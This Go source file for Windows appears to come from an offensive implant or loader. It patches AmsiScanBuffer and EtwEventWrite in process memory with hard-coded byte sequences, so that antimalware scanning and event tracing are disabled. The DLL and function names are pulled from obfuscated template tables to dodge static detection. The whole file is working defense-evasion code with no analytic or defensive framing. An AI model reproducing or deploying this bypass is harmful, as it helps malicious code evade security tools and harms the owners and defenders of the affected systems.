//go:build windows
// +build windows

package main

import (
	"fmt"
	"sync"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	idxPatchDllNtdll           = 871
	idxPatchApiVirtualProtect  = 887
	idxPatchApiGetCurrentProc  = 889

	idxPatchAmsiDll          = 1010
	idxPatchAmsiScanBuffer   = 1011
	idxPatchEtwEventWrite    = 1012
	idxPatchNtProtectVirtMem = 1013
)

func patchTpl(idx int) string {
	if v := bofTpl(idx); v != "" {
		return v
	}
	return iaTpl(idx)
}

func patchDllNtdll() string           { return patchTpl(idxPatchDllNtdll) }
func patchDllAmsi() string            { return patchTpl(idxPatchAmsiDll) }
func patchApiAmsiScanBuffer() string  { return patchTpl(idxPatchAmsiScanBuffer) }
func patchApiEtwEventWrite() string   { return patchTpl(idxPatchEtwEventWrite) }
func patchApiVirtualProtect() string  { return patchTpl(idxPatchApiVirtualProtect) }
func patchApiGetCurrentProcess() string { return patchTpl(idxPatchApiGetCurrentProc) }
func patchApiNtProtectVirtMem() string { return patchTpl(idxPatchNtProtectVirtMem) }

var (
	patchDllInitOnce sync.Once
	patchNtdllDLL    *syscall.LazyDLL

	virtualProtect         *syscall.LazyProc
	getCurrentProcess      *syscall.LazyProc
	ntProtectVirtualMemory *syscall.LazyProc
)

func initPatchDlls() {
	patchDllInitOnce.Do(func() {
		patchNtdllDLL = syscall.NewLazyDLL(patchDllNtdll())

		virtualProtect = kernel32DLL.NewProc(patchApiVirtualProtect())
		getCurrentProcess = kernel32DLL.NewProc(patchApiGetCurrentProcess())
		ntProtectVirtualMemory = patchNtdllDLL.NewProc(patchApiNtProtectVirtMem())
	})
}

func patchAMSI() error {
	dllName := patchDllAmsi()
	procName := patchApiAmsiScanBuffer()
	if dllName == "" || procName == "" {
		return fmt.Errorf(Err(E4))
	}

	amsi := windows.NewLazySystemDLL(dllName)
	amsiScanBuffer := amsi.NewProc(procName)

	if err := amsiScanBuffer.Find(); err != nil {
		return err
	}
	if amsiScanBuffer.Addr() == 0 {
		return fmt.Errorf(Err(E4))
	}

	var patch []byte
	if unsafe.Sizeof(uintptr(0)) == 8 {
		patch = []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}
	} else {
		patch = []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00}
	}

	return applyPatch(amsiScanBuffer.Addr(), patch)
}

func patchETW() error {
	dllName := patchDllNtdll()
	procName := patchApiEtwEventWrite()
	if dllName == "" || procName == "" {
		return fmt.Errorf(Err(E4))
	}

	ntdll := windows.NewLazySystemDLL(dllName)
	etwEventWrite := ntdll.NewProc(procName)

	if err := etwEventWrite.Find(); err != nil {
		return err
	}
	if etwEventWrite.Addr() == 0 {
		return fmt.Errorf(Err(E4))
	}

	var patch []byte
	if unsafe.Sizeof(uintptr(0)) == 8 {
		patch = []byte{0x33, 0xC0, 0xC3}
	} else {
		patch = []byte{0x33, 0xC0, 0xC2, 0x14, 0x00}
	}

	return applyPatch(etwEventWrite.Addr(), patch)
}

func applyPatch(addr uintptr, patch []byte) error {
	var oldProtect uint32

	err := windows.VirtualProtect(
		addr,
		uintptr(len(patch)),
		windows.PAGE_EXECUTE_READWRITE,
		&oldProtect,
	)
	if err != nil {
		return err
	}

	for i, b := range patch {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = b
	}

	handle := windows.CurrentProcess()
	flushInstructionCache.Call(
		uintptr(handle),
		addr,
		uintptr(len(patch)),
	)

	windows.VirtualProtect(
		addr,
		uintptr(len(patch)),
		oldProtect,
		&oldProtect,
	)

	return nil
}
